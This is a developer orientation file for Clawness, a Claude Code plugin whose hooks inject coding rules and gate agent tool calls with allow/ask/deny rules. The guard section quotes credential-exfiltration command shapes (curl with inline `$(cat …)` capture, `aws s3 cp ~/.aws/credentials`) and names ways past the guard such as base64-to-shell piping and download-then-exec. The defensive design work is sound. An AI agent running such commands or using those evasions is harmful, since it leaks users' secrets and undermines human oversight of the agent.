# CLAUDE.md — working on Clawness

Orientation for agents/devs working **on** this repo. User-facing docs live in
[README.md](README.md); release history in [CHANGELOG.md](CHANGELOG.md). This file
captures architecture, conventions, and the *why* behind non-obvious decisions.

## What this is
A **Claude Code plugin** that retrieves relevant coding rules and injects them
into every prompt via a `UserPromptSubmit` hook. Pure Python; **PyYAML is the only
dependency**. No ML models, no services, no Docker.

## Architecture (request flow)
1. `hooks/claude_hook.py` (UserPromptSubmit) loads global rules (plugin/clone
   `rules/`) + project rules (`<project>/.clawness/rules/`), retrieves, prints the
   block to stdout → Claude sees it.
2. Retrieval engine = `clawness/core.py`: **BM25 + TF-IDF fused via RRF**, over a
   **concept-expanded** token stream (`_CONCEPT_GROUPS`) + light stemming.
   Mandatory rules (`rules/_mandatory/`) always injected; rest ranked + budget-capped.
   A **relevance floor** (`CLAW_MIN_RELEVANCE`, default 0.06, gauged on TF-IDF cosine —
   not RRF, which is rank-based) drops scattershot matches so signal-less prompts
   inject few/no ranked rules. **Codebase-aware:** the hook detects the project stack
   (`detect_stack` → `scan_project`, fresh each prompt) and passes it to `Clawness`;
   off-stack language/framework rules (`_STACK_DOMAINS` minus detected) face a higher
   floor (`CLAW_OFFSTACK_MIN_RELEVANCE`, default 0.15) so e.g. a Python repo doesn't
   surface SQL/React noise, while strong cross-domain matches still pass. Cross-cutting
   domains (general/meta/workflows/security/testing) are never penalized. Passing no
   stack (CLI/eval) disables the penalty, so eval is unaffected. ~1ms/prompt + ~3ms scan.
   **Session-aware re-injection** (`clawness/session_state.py`): the mandatory block
   (identical every turn) renders in full only on prompt 1 and every `CLAW_FULL_EVERY`-th
   prompt after (default 5); other turns get a one-line id list — the rules stay just as
   binding, only their re-statement shrinks. State is a per-session JSON file in the OS
   temp dir (never the project), fails toward a full render on any error. Project memory
   follows the same cadence but reprints immediately on a changed mtime regardless of
   cadence, so a lesson just written is never abbreviated away.
3. **Project memory** (`<project>/.clawness/memory.md`): if present, the hook appends
   it verbatim after the rules block (`render_memory_block` in `core.py`) — a
   per-codebase lessons log, not a ranked rule, so it never touches the engine.
   Char-bounded by `CLAW_MEMORY_BUDGET` (default 2000), keeping the tail on overflow.
   Memory (and the few fixed suggested-action lines) sit *outside* `CLAW_BUDGET` by
   design — counting them in would make rule selection vary with memory length; total
   injection ≈ `CLAW_BUDGET` + `CLAW_MEMORY_BUDGET` + a few fixed lines.
   `WF-LESSONS-001` is the rule that tells Claude to maintain it. The file is
   auto-created on first session by `hooks/memory_init.py` (SessionStart) — gated to
   git work trees, opt-out `CLAW_NO_MEMORY`; it injects a note (like `git_check`) so
   Claude announces the file to the user, since hooks can't prompt directly.
4. **Session security** (defense, not retrieval — independent of the engine):
   - `hooks/access_guard.py` (PreToolUse; logic in `clawness/guard.py`) classifies each
     Bash/Write/Edit/Read call → `allow`/`ask`/`deny`. A hook decision overrides the
     user's permission allowlist, so `ask` fires *even on "always-allowed" tools* — the
     answer to approval fatigue. **`deny` is a HARD block with no in-Claude override**
     (verified on the VS Code build — the user can't approve it inline; retrying re-fires),
     so reserve it for ~zero-legit-use / exfil-signature cases: cloud-metadata,
     catastrophic `rm -rf` (a filesystem root / home / a *system dir itself* — a delete
     DEEPER under a system dir is ASK, not deny), reading a local secret into a network
     call, uploading a local secret (incl. via a cloud CLI — `aws s3 cp ~/.aws/credentials
     s3://…`), and **inline-capture** exfil — `$(…)`/backtick output embedded in a data
     upload to a host absent from the codebase. **The exfil denies are evaluated UP FRONT
     (before any ASK tier) on purpose** — `_classify_bash` returns on first match, so a
     compound command (`rm -rf ~/x && curl -d "$(cat s)" https://absent/`) would otherwise
     let an early ASK clause mask a later deny; don't reorder them below the ASK checks.
     A shell `>`/`>>` redirect to a control file (`_bash_redirect_hits_control_file`) is
     also caught, since it bypasses the Write-tool gate. Crucially a
     bare token env var (`Bearer $API_TOKEN`) is NOT a deny signal — it's routine auth,
     so a token-authenticated POST to an internal host absent from committed source only
     ASKS (see `_INLINE_CAPTURE_RE` vs `_VAR_EXPANSION_RE`). **`ask`** (which DOES surface
     an approve dialog) covers the dual-use and scope cases: pipe-to-shell and
     `git push --force` (not `--force-with-lease`, allowed), writes outside the project
     root (temp/plan files exempt via `is_plan_file`), credential-shaped reads, named
     installs, deep-system-dir deletes, data piped into a raw socket (`… | nc`), **any**
     cloud-storage upload (`aws s3 cp`/`gsutil`/`az blob`), and a credential-named URL
     download. The `_deny` reason text must not tell the model to "proceed on
     confirmation" — it can't; it points to the real escape hatches (run it yourself /
     `CLAW_NO_ACCESS_GUARD=1`). **Data-bearing curl/scp egress is provenance-tiered**:
     `value_in_project` searches the destination host across the project's own text files
     — a bounded walk that EXCLUDES `.claude/` so a hijacked skill can't launder a host
     into "trusted", 15-min verdict cache — endogenous (in the repo) → ask, absent → ask
     (or deny for the inline-capture shape). Note a known host still ASKS for a data
     upload; provenance only flips the inline-capture case between deny and ask, so it can
     never buy a *silent* egress. **Cloud uploads are deliberately NOT provenance-downgraded
     to allow** — source is forgeable (a rogue postinstall or injected Write could plant a
     bucket name), so `aws s3 cp <secret> s3://planted-bucket` would be silent exfil; every
     cloud upload asks once per bucket instead. Asks once **per destination** per session:
     for egress the dedup key is the host/bucket (`_egress_targets`), not the exact command,
     so iterating upload payloads to one host asks once; other tiers key on the path/command. Keys are sha256-hashed so raw command
     text never touches disk. **Two-phase**: PreToolUse records a target `pending`; a
     PostToolUse companion (same matcher) promotes it to `confirmed` only once the call
     actually completes AND the payload carries a `tool_response` (execution evidence —
     defense-in-depth so a declined call never settles even if a build fired PostToolUse
     for it), so a declined/abandoned ask re-asks on retry instead of going silent for the
     session. Ledger/cache writes are atomic (`atomic_write_text`, temp + `os.replace`) so
     concurrent sessions never read a torn file. Pure-logic core, fails open, `CLAW_NO_ACCESS_GUARD`.
   - `hooks/trust_ledger.py` (SessionStart; logic in `clawness/trust.py`) keeps TOFU
     fingerprints of skills/agents/commands/MCP servers in `.clawness/trust_ledger.json`
     and injects a note when one changed/appeared; `clawness audit-skills` scans those
     artifacts for injection tells. Fails open, `CLAW_NO_TRUST_LEDGER`.

## Key files
- `clawness/core.py` — engine (rules loader, tokenizer + `_CONCEPT_GROUPS`, BM25,
  TF-IDF, RRF, `Clawness` class, `rank_ids`, rendering, `render_memory_block`).
- `clawness/cli.py` — `clawness` CLI: query, stats, lint, bench, eval, init, plan, agents-md, audit-skills.
- `clawness/plan.py` — plan-gate logic (`gate_decision`, `is_plan_file`, session approval).
- `clawness/guard.py` — access-guard logic (`classify_tool_call`, `value_in_project`, ask-ledger).
- `clawness/trust.py` — trust-ledger logic (`scan_artifacts`, `diff_ledger`, `scan_injection_tells`).
- `clawness/session_state.py` — per-session prompt-count/memory-mtime tracking for
  session-aware re-injection (`bump_prompt_count`, `memory_changed`, `should_show_full`).
- `hooks/` — runtime hooks (`claude_hook`, `compress_output`, `plan_gate`, `access_guard`,
  `trust_ledger`, `git_check`, `memory_init`, `stack_detect`, `ensure_deps`) + setup helpers (`setup_settings/agents/skills` — manual install only).
- `rules/<domain>/*.yml` — the corpus (118 rules / 18 domains; `_mandatory/` = always-on).
- `agents/*.md`, `skills/<name>/SKILL.md` — auto-discovered by the plugin.
- `.claude-plugin/{plugin.json,marketplace.json}` — plugin + marketplace manifests.
- `tests/ground_truth.json` — labeled eval queries (grow it when adding rule areas).

## Design decisions (don't undo without reading these)
- **Lexical + concept retrieval only.** model2vec/semantic was removed in 0.3.0:
  a per-prompt hook is a fresh process every turn, so the model reloaded each time
  (blew the hook timeout), and it scored no better than lexical on the eval. The
  **concept dictionary (`_CONCEPT_GROUPS`) is our "semantic"** — enrich *that* for
  better recall, never add a model to the hot path.
- **Hook commands use a portable interpreter picker** `for p in python3 python py; …`
  (Windows has no `python3`; Claude runs hooks via a POSIX shell). Same picker in
  `plugin.json` and what `setup_settings.py` writes.
- **Plan gate rides native plan mode.** `PreToolUse` denies edits until ExitPlanMode
  is recorded for the session. **Plan-file writes (`<config>/plans/`) are exempt**
  (`is_plan_file`) — gating them is a catch-22. Fails open on any error.
- **Token efficiency:** mandatory rules render compact (id+RULE only); `CLAW_VERBOSE`
  / `CLAW_COMPACT` toggle. Keep the per-turn block lean.
- **Two install paths:** plugin (hooks declared in `plugin.json`, loaded from cache)
  vs manual (`install.sh`/`install.ps1` → editable `pip install` + `setup_settings.py`
  writes hooks to `settings.json`). The plugin path does NOT install the `clawness`
  CLI — plugin users verify via `/clawness:status`.
- **Naming:** package `clawness`, env vars `CLAW_*`, project dir `.clawness/`. (The
  `infinri/Writ` mentions in README and CHANGELOG are upstream credit / historical
  record — leave those. Everywhere else was renamed to Clawness; `install.ps1` keeps a
  `-WritDir` alias for back-compat only.)
- **The access guard is a harm-reduction tripwire, not a security boundary.** It is
  regex/heuristics over tool inputs the agent controls, so a determined adversary can
  obfuscate around it (`| base64 -d | sh`, download-then-exec, `python -c`, token
  munging). It exists to catch *honest mistakes and low-effort/​injected attacks* and
  to break approval-fatigue autopilot — not to sandbox a hostile agent. The real
  boundary is the deferred devcontainer + egress allowlist; keep that framing in the
  docs so users don't over-trust it. **Design rule: never nag normal dev work.**
  In-project secret reads and hardcoded/​endogenous values are allowed silently; only
  reaching for secrets *outside* the project, *sending* data to a host absent from the
  codebase, or editing the guard's own kill-switch files (`_is_control_file`) trips a
  prompt. When tightening detection, widen DENY conservatively (a false deny blocks
  real work) and prefer ASK.

## Dev workflow
- Test: `python -m pytest tests/` (set `CLAW_NO_PLAN_GATE=1` if the gate blocks your
  edits in this repo — but **unset it before running the suite**, since the plan-gate
  tests assert the gate is on and will fail with it disabled).
- Rules: `clawness lint` (rejects missing fields **and vague phrasing**),
  `clawness eval --floor-mrr 0.85 --floor-hit 0.95` (MRR@5/hit-rate; CI-gated),
  `clawness stats`, `clawness bench`.
- CI (`.github/workflows/ci.yml`) runs lint + tests + eval across ubuntu/macOS/windows × py3.10–3.14.

## Gotchas
- **Always pass `encoding="utf-8"` on file I/O and stdin/stdout.** The corpus uses
  em-dashes/smart-quotes; bare `open()`/`read_text()`/`sys.stdin` default to cp1252
  on Windows and mangle them into mojibake (`—` → `â€"`) *at load time*. `clawness
  lint` now flags non-UTF-8 / U+FFFD rule files; keep new reads/writes UTF-8.
- **Keep the hook ~1ms** — no heavy imports or model loads in `claude_hook.py`/`core.py`.
- **Version lives in 4 places** — bump `pyproject.toml`, `.claude-plugin/plugin.json`,
  `.claude-plugin/marketplace.json`, and `clawness/__init__.py` (`__version__`) together,
  and add a CHANGELOG entry. `tests/test_version.py` asserts all four agree + a CHANGELOG
  entry exists, so a drift fails CI.
- Rule YAML: `id, domain, severity, tags, triggers, when, rule, violation, correct`
  (concept terms must be single tokens; multi-word phrases never match).
- **`{{CURRENT_DATE}}`** in any rule field is replaced at render time with the live
  month + year (e.g. "June 2026") — see `_DATE_TOKEN`/`_current_date` in `core.py`.
  Substituted only on render, not in the search text, so retrieval stays
  date-independent. `ENF-CURRENT-001` uses it.
- Two things can't be tested from a sandbox: a real `pip install -e .` completing,
  and plugin hooks on a real Windows + python.org box. Smoke-test both before release.
  The access guard's decline path is now covered two ways so it's no longer a
  load-bearing manual check: `tests/test_access_guard_hook.py` drives the real hook at
  the dispatch level (PreToolUse records `pending`, PostToolUse confirms only WITH a
  `tool_response`), and the confirm additionally requires that execution evidence — so
  even if a build ever fired PostToolUse for a declined call, it wouldn't settle. A
  real-session decline click-test (ask → "no" → retry → must ask again) is still a nice
  final sanity check, but defense-in-depth no longer rests on it.
